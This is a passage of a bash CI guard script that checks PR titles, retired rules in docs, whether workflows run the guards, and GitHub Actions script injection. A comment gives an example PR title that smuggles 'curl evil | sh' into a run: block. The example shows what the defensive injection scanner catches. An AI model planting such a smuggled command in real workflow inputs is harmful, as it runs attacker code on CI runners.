  # subject check would fail PRs over a line GitHub throws away. Set it to 1 in
  # a repo still on the GitHub default.
  if [ "$PR_TITLE_CHECK_SUBJECT" != "1" ]; then
    echo "✓ PR title carries v$ver and a conventional type (the squash subject is the PR title under the standard settings)."
    return 0
  fi
  n=$(git rev-list --count "${MERGE_BASE}..${HEAD_SHA}")
  if [ "$n" = "1" ]; then
    subject=$(git log -1 --format=%s "$HEAD_SHA")
    if ! printf '%s' "$subject" | matches -E "^v${ver//./\\.} "; then
      echo "::error::Single-commit PR: GitHub squashes with the COMMIT SUBJECT, not the title. Put 'v$ver' in the commit subject too, or pass --subject when merging."
      echo "  commit subject: $subject"
      return 1
    fi
  fi
  echo "✓ PR title (and squash subject) carry v$ver and a conventional type."
}

# An operative doc must not restate a rule the project has retired.
#
# Retiring a rule is one edit; finding every doc that still teaches it is the
# part that gets skipped. Claros moved to automatic deploys and its CLAUDE.md
# kept saying "deploys are manual" — to every agent, every session, until a
# grep found it. Agents obey the doc in front of them, so a stale instruction is
# worse than a missing one.
#
# RETIRED_RULES: one "<regex>|<where the rule moved>" per line. The LAST '|'
# splits them, so the regex may use alternation. Matched case-insensitively
# against tracked files matching RETIRED_RULES_DOCS. History (CHANGELOG, retros,
# ADRs) is not operative and should stay out of that pattern: it records what
# was true then. Empty RETIRED_RULES = off.
cmd_retired_rules() {
  [ -n "$RETIRED_RULES" ] || { echo "✓ retired-rules not configured."; return 0; }
  local docs line re where doc hits bad=0
  docs=$(git ls-files | grep -E "$RETIRED_RULES_DOCS" || true)
  if [ -z "$docs" ]; then
    echo "✓ no operative docs (matching RETIRED_RULES_DOCS) to scan."; return 0
  fi
  while IFS= read -r line; do
    [ -n "$line" ] || continue
    case "$line" in
      *'|'*) re="${line%|*}"; where="${line##*|}" ;;
      *) echo "::error::RETIRED_RULES line has no '|<where it moved>': $line"; bad=1; continue ;;
    esac
    while IFS= read -r doc; do
      [ -f "$doc" ] || continue
      hits=$(grep -niE "$re" "$doc" || true)
      [ -n "$hits" ] || continue
      echo "::error::$doc restates a retired rule (/$re/). It now lives in: $where"
      printf '%s\n' "$hits" | sed "s|^|    $doc:|"
      bad=1
    done <<< "$docs"
  done <<< "$RETIRED_RULES"
  [ "$bad" -eq 0 ] || return 1
  echo "✓ no operative doc restates a retired rule."
}

# Workflow files, one per line, or nothing. Run from the repo root.
_workflows() {
  [ -d .github/workflows ] || return 0
  find .github/workflows -maxdepth 1 -type f \( -name '*.yml' -o -name '*.yaml' \) | sort
}

# Every guard must actually be RUN by a workflow.
#
# Registering a guard is not the same as running it. RIA v2.30.3 found three
# guards that were in its script, in its `all` list, green on every local run —
# and not a step in any workflow, so they had never gated a single PR. Nothing
# looked wrong, because a guard that never runs never fails.
#
# One `guards.sh all` covers everything, guards.d included. Without it, each
# guard must be invoked by name. Commented YAML lines do not count. A guard
# reached only through `make guards` is not seen here — call guards.sh from the
# workflow directly, so this can read it.
#
# The match is anchored on both sides: `guards.sh` must start a word or follow a
# '/', and `all` (or the guard name) must end at whitespace or end of line. The
# first version accepted a quote as the terminator and no prefix at all, so
# `echo "see guards.sh"` and RIA's own `ci-guards.sh all` both counted as the
# template's guards being wired.
cmd_workflow_wired() {
  local wfs body g missing=""
  wfs=$(_workflows)
  if [ -z "$wfs" ]; then
    echo "::error::No workflow under .github/workflows/ — no guard here has ever gated a PR. Install workflows/guards.yml from the template."
    return 1
  fi
  # Uncommented lines only; the file list is newline-separated, never empty here.
  body=$(while IFS= read -r f; do grep -vE '^[[:space:]]*#' "$f" || true; done <<< "$wfs")
  if printf '%s\n' "$body" | matches -E "(^|[/[:space:]])guards\.sh[[:space:]]+all([[:space:]]|\$)"; then
    echo "✓ a workflow runs 'guards.sh all' — every guard (core and guards.d) gates PRs."
    return 0
  fi
  for g in "${CORE[@]}" ${EXTRA[@]+"${EXTRA[@]}"}; do
    printf '%s\n' "$body" | matches -E "(^|[/[:space:]])guards\.sh[[:space:]]+${g}([[:space:]]|\$)" || missing="$missing $g"
  done
  if [ -n "$missing" ]; then
    echo "::error::No workflow runs 'guards.sh all', and these guards are never invoked by name:$missing"
    echo "  A guard that no workflow runs has never gated a PR, however green it is locally."
    return 1
  fi
  echo "✓ every guard is invoked by name in a workflow."
}

# No untrusted ${{ }} expression pasted straight into a shell `run:` block.
#
# Actions substitutes ${{ }} into the script text BEFORE the shell sees it, so a
# PR title of  a"; curl evil | sh; "  becomes code. The fix is always the same:
# put the expression in `env:` and reference "$VAR", which the shell treats as
# data. This was live in two repos when the template gained this guard — RIA and
# social-trade's summary.yml pasted model output derived from an issue body into
# a `run:` line, with `issues: write`.
#
# Flags, inside run: blocks only (an `if:` or `env:` is evaluated, not pasted):
#   - github.event.*  — except fields ending .sha .number .id .before .after,
#                       which are hex or integers GitHub generates, and four the
#                       REPO controls: repository.default_branch, .full_name,
#                       .name and pull_request.base.ref. Titles, bodies, labels,
#                       head refs, names, emails and comment text are all chosen
#                       by whoever opened the PR or issue.
#   - github.head_ref — the branch name, chosen by whoever opened the PR.
#   - steps.*.outputs.* — whatever a step emitted, often derived from the above.
#   - inputs.*        — a workflow_dispatch / workflow_call string input is
#                       whatever the caller typed.
#   - env.*           — `${{ env.X }}` is template-expanded too, so an env value
#                       holding a title is pasted just the same. The variable is
#                       already in the shell's environment: write "$X".
# An expression is read up to its closing `}}`, so format('{0}', …) is one
# expression, not cut at the first `}`. `#` lines inside a run: block are
# scanned too — Actions expands ${{ }} in them before bash ever sees a comment.
# Not covered: `script:` in actions/github-script, which has the same bug in JS.
cmd_workflow_injection() {
  local wfs hits="" f out
  wfs=$(_workflows)
  [ -n "$wfs" ] || { echo "✓ no workflows to scan."; return 0; }
  while IFS= read -r f; do
    out=$(awk -v F="$f" '
      function indent(l) { match(l, /^[ \t]*(- )?/); return RLENGTH }
      function safe_event(seg) {
        if (seg ~ /\.(sha|number|id|before|after)$/) return 1
        return (seg == "github.event.repository.default_branch" \
             || seg == "github.event.repository.full_name" \
             || seg == "github.event.repository.name" \
             || seg == "github.event.pull_request.base.ref")
      }
      function scan(l, ln,   rest, s, e, x, sp, bad, p, seg, envvar) {
        rest = l
        while ((s = index(rest, "${{")) > 0) {
          rest = substr(rest, s)
          e = index(substr(rest, 4), "}}")
          if (e == 0) break
          x = substr(rest, 1, e + 4)
          rest = substr(rest, e + 5)
          sp = " " x
          bad = 0; envvar = ""
          if (x ~ /github\.head_ref/ || x ~ /steps\.[^ }]+\.outputs\./) bad = 1
          if (sp ~ /[^A-Za-z0-9_.]inputs\.[A-Za-z_]/) bad = 1
          if (match(sp, /[^A-Za-z0-9_.]env\.[A-Za-z_][A-Za-z0-9_]*/)) {
            bad = 1; envvar = substr(sp, RSTART + 5, RLENGTH - 5)
          }
          p = x
          while (match(p, /github\.event\.[A-Za-z0-9_.*-]+/)) {
            seg = substr(p, RSTART, RLENGTH); p = substr(p, RSTART + RLENGTH)
            if (!safe_event(seg)) bad = 1
          }
          if (!bad) continue
          if (envvar != "") print F ":" ln ": " x "  — write \"$" envvar "\"; the env var is already set"
          else print F ":" ln ": " x
        }
      }
      {
        line = $0
        if (inrun) {
          if (line ~ /^[ \t]*$/ || indent(line) > runind) { scan(line, NR); next }
          inrun = 0
        }
        if (line ~ /^[ \t]*(- )?run:/) {
          runind = indent(line); inrun = 1
          sub(/^[ \t]*(- )?run:/, "", line)
          scan(line, NR)
        }
      }' "$f")
    [ -z "$out" ] || hits="$hits$out"$'\n'
  done <<< "$wfs"
  if [ -n "$hits" ]; then
    echo "::error::A run: block pastes an untrusted \${{ }} expression into shell. Move it to env: and use \"\$VAR\"."
    printf '%s' "$hits" | sed 's/^/    /'
    return 1
  fi
  echo "✓ no run: block interpolates untrusted \${{ }} expressions."
}

# ---------------------------------------------------------------------------
# Project-specific guards. Each file defines cmd_<name> and appends to EXTRA.
# ---------------------------------------------------------------------------
EXTRA=()
if [ -d "$HERE/guards.d" ]; then
  for f in "$HERE/guards.d"/*.sh; do
    [ -f "$f" ] || continue
    # shellcheck source=/dev/null
    . "$f"
  done
fi

CORE=(scope docs tests changelog changelog-archive version-sync bump-level retro retro-debt followups pr-title retired-rules workflow-wired workflow-injection)

run_one() {
  local name="$1" fn
  fn="cmd_$(printf '%s' "$name" | tr '-' '_')"
  if ! declare -F "$fn" >/dev/null; then
    echo "::error::unknown guard: $name"; return 1
  fi
  "$fn"
}

case "${1:-all}" in
  list)
    printf 'core:    %s\n' "${CORE[*]}"
    printf 'project: %s\n' "${EXTRA[*]-<none>}"
    ;;
  all)
    rc=0
    # Under Actions each guard gets a collapsible group, so the log names the
    # one that failed instead of burying it in one long step.
    for g in "${CORE[@]}" ${EXTRA[@]+"${EXTRA[@]}"}; do
      if [ -n "${GITHUB_ACTIONS:-}" ]; then echo "::group::$g"; else echo "--- $g ---"; fi
      run_one "$g" || rc=1
      if [ -n "${GITHUB_ACTIONS:-}" ]; then echo "::endgroup::"; fi
    done
    exit $rc
    ;;
  *) run_one "$1" ;;
esac
